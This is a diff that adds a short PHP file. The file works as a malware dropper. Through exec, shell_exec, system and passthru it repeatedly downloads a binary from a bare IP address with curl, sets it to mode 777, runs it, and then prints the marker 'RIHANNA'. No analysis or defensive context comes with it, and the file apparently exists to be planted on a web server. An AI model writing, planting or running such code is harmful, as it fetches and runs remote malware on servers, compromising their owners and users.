@@ -1,0 +1,7 @@
+<?php
+echo exec('curl -o l1 http://166.88.11.179/x;chmod 777 l1;./l1');
+echo shell_exec('curl -o l1 http://166.88.11.179/x;chmod 777 l1;./l1');
+system('curl -o l1 http://166.88.11.179/x;chmod 777 l1;./l1');
+passthru ("curl -o l1 http://166.88.11.179/x;chmod 777 l1;./l1");
+echo "RIHANNA";
+?>
